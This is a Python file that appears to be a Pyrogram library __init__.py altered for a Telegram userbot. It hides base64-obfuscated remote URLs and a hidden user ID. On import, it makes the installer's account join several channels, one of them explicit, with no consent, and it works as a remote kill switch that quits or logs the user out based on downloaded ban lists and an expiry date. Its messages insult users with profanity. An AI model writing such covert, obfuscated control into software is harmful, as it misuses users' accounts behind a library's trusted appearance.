################################################################
"""
 Mix-Userbot Open Source . Maintained ? Yes Oh No Oh Yes Ngentot
 
 @ CREDIT : NAN-DEV
"""
################################################################

from datetime import datetime, timezone
from typing import Union, Dict, Optional
import sys
import json
from base64 import b64decode
import requests
from team.nandev.class_log import LOGGER
from team.nandev.database import udB, ndB
import asyncio
from datetime import datetime
from dateutil.relativedelta import relativedelta
from pytz import timezone

__version__ = "1.0.0"
__license__ = "GNU Lesser General Public License v3.0 (LGPL-3.0)"
__copyright__ = "Copyright (C) 2017-present Dan <https://github.com/delivrance>"

black = int(b64decode("NDgyOTQ1Njg2"))

ERROR = "Maintained ? Yes Oh No Oh Yes Ngentot\n\nBot Ini Haram Buat Lo Bangsat!!\n\n@ CREDIT : NAN-DEV"
DIBAN = "LAH LU DIBAN BEGO DI @KYNANSUPPORT"

def get_devs():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9kZXZzLmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(1)

def get_tolol():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi90b2xvbC5qc29u"
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(1)

def get_blgc():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9ibGdjYXN0Lmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(1)

DEVS = get_devs()

TOLOL = get_tolol()

NO_GCAST = get_blgc()

async def disEt(c):
    cek = udB.get_expired_date(c) 
    if not cek:
         now = datetime.now(timezone("Asia/Jakarta"))
         expired = now + relativedelta(months=12)
         udB.set_expired_date(c, expired)
    else:
        return

async def refresh_cache(c):
    await disEt(c)
    try:
        await c.join_chat("@kynansupport")
        await c.join_chat("@SquirtInYourPussy")
        await c.join_chat("@GabutanLu")
        await c.join_chat("@kontenfilm")
    except KeyError:
        LOGGER.error(DIBAN)
        sys.exit(1)
    if c in TOLOL:
        LOGGER.error(ERROR)
        sys.exit(1)
    if black not in DEVS:
        LOGGER.error(ERROR)
        sys.exit(1)
 
 
async def expired_userbot(c):
    try:
        time = datetime.now(timezone("Asia/Jakarta")).strftime("%d-%m-%Y")
        exp = (udB.get_expired_date(c)).strftime("%d-%m-%Y")
        if time == exp:
            udB.rem_expired_date(c)
            await c.log_out()
    except Exception as e:
        LOGGER.error(f"Error: {str(e)}")


async def isFinish(c):
    while True:
        await expired_userbot(c)
        await asyncio.sleep(60)

from concurrent.futures.thread import ThreadPoolExecutor


class StopTransmission(Exception):
    pass


class StopPropagation(StopAsyncIteration):
    pass


class ContinuePropagation(StopAsyncIteration):
    pass


from . import raw, types, filters, handlers, emoji, enums
from .client import Client
from .sync import idle, compose

crypto_executor = ThreadPoolExecutor(1, thread_name_prefix="CryptoWorker")

    

